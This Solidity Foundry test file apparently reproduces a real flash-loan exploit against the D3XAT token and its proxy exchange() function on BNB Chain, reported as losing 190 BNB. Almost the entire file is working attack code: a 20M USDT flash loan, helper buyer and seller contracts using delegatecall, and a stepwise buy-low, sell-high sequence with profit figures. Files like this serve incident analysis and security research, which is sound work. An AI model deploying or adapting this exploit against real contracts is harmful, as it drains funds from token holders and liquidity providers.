// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 190 BNB
// Attacker : https://bscscan.com/address/0x4b63c0cf524f71847ea05b59f3077a224d922e8d
// Attack Contract : https://bscscan.com/address/0x3b3e1edeb726b52d5de79cf8dd8b84995d9aa27c
// Vulnerable Contract : N/A
// Attack Tx : https://bscscan.com/tx/0x26bcefc152d8cd49f4bb13a9f8a6846be887d7075bc81fa07aa8c0019bd6591f

// @Info
// Vulnerable Contract Code : N/A

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/suplabsyi/status/1956695597546893598
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant PANCAKE_V3_POOL = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant USDT_ADDR = 0x55d398326f99059fF775485246999027B3197955;
address constant PROXY = 0xb8ad82c4771DAa852DdF00b70Ba4bE57D22eDD99;
address constant D3XAT = 0x2Cc8B879E3663d8126fe15daDaaA6Ca8D964BbBE;

contract d3xai is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 57780985 - 1;

    uint256 numPancakeOperRound = 27;
    address[] public pancakeBuyers = new address[](numPancakeOperRound);
    address[] public pancakeSellers = new address[](numPancakeOperRound);

    uint256 numProxyOperRound = 2;
    address[] public proxyBuyers = new address[](numProxyOperRound);
    ProxySeller proxySeller;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = USDT_ADDR;

        ProxyBuyerHelper proxyBuyerHelper = new ProxyBuyerHelper();
        for (uint256 i = 0; i < proxyBuyers.length; i++) {
            ProxyBuyer buyer = new ProxyBuyer(address(proxyBuyerHelper));
            proxyBuyers[i] = address(buyer);
        }
        proxySeller = new ProxySeller();

        PancakeBuyerHelper pancakeBuyerHelper = new PancakeBuyerHelper();
        for (uint256 i = 0; i < pancakeBuyers.length; i++) {
            PancakeBuyer buyer = new PancakeBuyer(address(pancakeBuyerHelper));
            pancakeBuyers[i] = address(buyer);
        }
        for (uint256 i = 0; i < pancakeSellers.length; i++) {
            PancakeSeller seller = new PancakeSeller();
            pancakeSellers[i] = address(seller);
        }
    }

    function testExploit() public balanceLog {
        // Root cause: the proxy’s exchange() lets us buy low / sell high
        // Attacker exploits it using a convoluted multi-step flow

        // Step 1: flash loan 20M USDT
        uint256 borrowAmount = 20_000_000 ether;
        IPancakeV3PoolActions(PANCAKE_V3_POOL).flash(address(this), borrowAmount, 0, "");
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) public {
        IERC20 usdt = IERC20(USDT_ADDR);
    
        // Step 2: spends 24k USDT to buy D3XAT via the exchange()
        address[] memory USDT_D3XAT_PATH = new address[](2);
        USDT_D3XAT_PATH[0] = USDT_ADDR;
        USDT_D3XAT_PATH[1] = D3XAT;
        uint256 balStart = usdt.balanceOf(address(this));
        for (uint256 i = 0; i < proxyBuyers.length; i++) {
            ProxyBuyer buyer = ProxyBuyer(proxyBuyers[i]);
            uint256 amountOut = 9000 ether;
            (uint256[] memory amounts) = IPancakeRouter(payable(PANCAKE_ROUTER)).getAmountsIn(amountOut, USDT_D3XAT_PATH);
            uint256 amountIn = amounts[0];

            usdt.approve(address(buyer), amountIn);
            buyer.buy(PROXY, USDT_ADDR, D3XAT, address(proxySeller), amountIn);
        }

        // Step 3: spend ~6.18M USDT to buy D3XAT from Pancake Router
        for (uint256 i = 0; i < pancakeBuyers.length; i++) {
            PancakeBuyer buyer = PancakeBuyer(pancakeBuyers[i]);
            uint256 amountOut = 9900 ether;
            (uint256[] memory amounts) = IPancakeRouter(payable(PANCAKE_ROUTER)).getAmountsIn(amountOut, USDT_D3XAT_PATH);
            uint256 amountIn = amounts[0];
            usdt.approve(address(buyer), amountIn);
            buyer.buy(USDT_ADDR, D3XAT, pancakeSellers[i], amountIn);
        }

        // Step 4: sell D3XAT from Step 2 via the exchange(). Gain 22.5k USDT
        for (uint256 i = 0; i < 30; i++) {
            uint256 amount = 29740606898687781957;
            try proxySeller.sell(PROXY, D3XAT, USDT_ADDR, amount, address(this)) {
            } catch {
                break;
            }
        }

        // Step 5: sell D3XAT from Step 3 to Pancake Router. Gain ~6.11M USDT
        IERC20 d3xat = IERC20(D3XAT);
        for (uint256 i = 0; i < pancakeSellers.length; i++) {
            PancakeSeller seller = PancakeSeller(pancakeSellers[i]);
            if (d3xat.balanceOf(address(seller)) > 0) {
                seller.sell(USDT_ADDR, D3XAT, address(this));
            }
        }

        IERC20(USDT_ADDR).transfer(PANCAKE_V3_POOL, 20_000_000 ether + fee0);
    }
}

contract PancakeBuyerHelper {
    // 0xacfca76f
    function buy(address token1, address token2, address receiver, uint256 amount) public {
        IERC20 usdt = IERC20(token1);
        IERC20 d3xat = IERC20(token2);
        usdt.transferFrom(msg.sender, address(this), amount);
        usdt.approve(PANCAKE_ROUTER, amount);

        address[] memory path = new address[](2);
        path[0] = token1;
        path[1] = token2;

        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
        uint256 bal = d3xat.balanceOf(address(this));
        d3xat.transfer(receiver, bal);
    }
}

contract PancakeBuyer {
    address targetContract;
    constructor(address target) {
        targetContract = target;
    }
    // 0xacfca76f
    function buy(address token1, address token2, address receiver, uint256 amount) public {
        (bool success, bytes memory result) = targetContract.delegatecall(
            abi.encodeWithSignature("buy(address,address,address,uint256)", token1, token2, receiver, amount)
        );
    }
}

contract PancakeSeller {
    // 0x83b95948
    function sell(address tokenOut, address tokenIn, address receiver) public {
        IERC20 d3xat = IERC20(tokenIn);
        IERC20 usdt = IERC20(tokenOut);
        uint256 d3Bal = d3xat.balanceOf(address(this));
        d3xat.approve(PANCAKE_ROUTER, d3Bal);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(d3Bal, 0, path, address(this), block.timestamp);
        uint256 bal = usdt.balanceOf(address(this));
        usdt.transfer(receiver, bal);
    }
}

contract ProxyBuyerHelper {
    // 0xe09618e9
    function buy(address proxy, address token1, address token2, address receiver, uint256 amount) public {
        IERC20 usdt = IERC20(token1);
        IERC20 d3xat = IERC20(token2);
        usdt.transferFrom(msg.sender, address(this), amount);
        usdt.approve(proxy, amount);

        address[] memory path = new address[](2);
        path[0] = token1;
        path[1] = token2;

        IProxy(proxy).exchange(token1, token2, amount);
        uint256 bal = d3xat.balanceOf(address(this));
        d3xat.transfer(receiver, bal);
    }
}

contract ProxyBuyer {
    address targetContract;
    constructor(address target) {
        targetContract = target;
    }
    // 0xe09618e9
    function buy(address proxy, address token1, address token2, address receiver, uint256 amount) public {
        (bool success, bytes memory result) = targetContract.delegatecall(
            abi.encodeWithSignature("buy(address,address,address,address,uint256)", proxy, token1, token2, receiver, amount)
        );
    }
}


contract ProxySeller {
    // 0x82839fae
    function sell(address proxy, address fromToken, address toToken, uint256 amount, address receiver) public {
        IERC20 d3xat = IERC20(fromToken);
        IERC20 usdt = IERC20(toToken);
        uint256 d3Bal = d3xat.balanceOf(address(this));
        d3xat.approve(proxy, amount);
        IProxy(proxy).exchange(fromToken, toToken, amount);
        uint256 bal = usdt.balanceOf(address(this));
        usdt.transfer(receiver, bal);
    }
}


interface IProxy {
    function exchange(address fromToken, address toToken, uint256 amount) external;
}
